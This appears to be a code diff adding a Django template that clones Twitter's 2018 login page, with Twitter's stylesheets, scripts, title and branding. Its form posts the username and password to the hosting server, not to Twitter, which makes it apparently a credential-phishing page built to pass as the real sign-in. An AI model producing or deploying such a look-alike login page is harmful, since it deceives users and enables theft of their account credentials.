@@ -1,0 +1,76 @@
+
+<!DOCTYPE html>
+<html lang="en" data-scribe-reduced-action-queue="true">
+  <head>
+    <link rel="stylesheet" href="https://abs.twimg.com/a/1532409277/css/t1/twitter_core.bundle.css" class="coreCSSBundles">
+    <link rel="stylesheet" class="moreCSSBundles" href="https://abs.twimg.com/a/1532409277/css/t1/twitter_more_1.bundle.css">
+    <link rel="stylesheet" class="moreCSSBundles" href="https://abs.twimg.com/a/1532409277/css/t1/twitter_more_2.bundle.css">
+    <link rel="dns-prefetch" href="https://pbs.twimg.com">
+    <link rel="dns-prefetch" href="https://t.co">
+    <link rel="preload" href="https://abs.twimg.com/k/en/init.en.51dab4fee56f4c2ebff7.js" as="script">
+    <link rel="preload" href="https://abs.twimg.com/k/en/0.commons.en.dc15f3fe298863985d75.js" as="script">
+    <title>Login on Twitter</title>
+      <meta name="robots" content="NOODP">
+      <meta name="description" content="Welcome back to Twitter. Sign in now to check your notifications, join the conversation and catch up on Tweets from the people you follow.">
+      <meta name="msapplication-TileImage" content="//abs.twimg.com/favicons/win8-tile-144.png"/>
+      <meta name="msapplication-TileColor" content="#00aced"/>
+  </head>
+  <body class="three-col logged-out ms-windows" data-fouc-class-names="swift-loading no-nav-banners" dir="ltr">
+    <div id="doc" data-at-shortcutkeys="{&quot;Enter&quot;:&quot;Open Tweet details&quot;,&quot;o&quot;:&quot;Expand photo&quot;,&quot;/&quot;:&quot;Search&quot;,&quot;?&quot;:&quot;This menu&quot;,&quot;j&quot;:&quot;Next Tweet&quot;,&quot;k&quot;:&quot;Previous Tweet&quot;,&quot;Space&quot;:&quot;Page down&quot;,&quot;.&quot;:&quot;Load new Tweets&quot;,&quot;gu&quot;:&quot;Go to user\u2026&quot;}" class="route-login login-responsive">
+        <div class="topbar js-topbar">
+    <div class="global-nav global-nav--newLoggedOut" data-section-term="top_nav">
+      <div class="global-nav-inner">
+        <div class="container">
+
+
+<ul class="nav js-global-actions" role="navigation" id="global-actions">
+  <li id="global-nav-home" class="home" data-global-action="home">
+    <a class="js-nav js-tooltip js-dynamic-tooltip" data-placement="bottom" href="/" data-component-context="home_nav" data-nav="home">
+      <span class="Icon Icon--bird Icon--large"></span>
+      <span class="text" aria-hidden="true">Home</span>
+      <span class="u-hiddenVisually a11y-inactive-page-text">Home</span>
+      <span class="u-hiddenVisually a11y-active-page-text">Home, current page.</span>
+    </a>
+  </li>
+    <li id="global-nav-about" class="about" data-global-action="about">
+      <a class="js-tooltip js-dynamic-tooltip" data-placement="bottom" href="https://about.twitter.com/" target="_blank" data-component-context="about_nav" data-nav="about" rel="noopener">
+        <span class="text">About</span>
+      </a>
+    </li>
+</ul>
+        </div>
+      </div>
+    </div>
+
+
+        <div id="page-outer">
+          <div id="page-container" class="AppContent wrapper wrapper-login">
+
+            <div class="page-canvas">
+
+  <div class="signin-wrapper" data-login-message="">
+    <h1>Log in to Twitter</h1>
+    <form class="t1-form clearfix signin js-signin" method="post">
+    {% csrf_token %}
+      <input type="text" name="username" placeholder="Username"/><br/><br/>
+      <input type="password" name="password" placeholder="Password"/><br/><br/>
+    <button type="submit" class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Log in</button>
+    </form>
+</div>
+  <div class="clearfix mobile has-sms">
+    <p class="signup-helper">
+      New to Twitter?
+      <a id="login-signup-link" href="/register">Sign up now&#32;&raquo;</a>
+    </p>
+  </div>
+            </div>
+          </div>
+
+
+</div>
+    </div>
+
+
+
+  </body>
+</html>
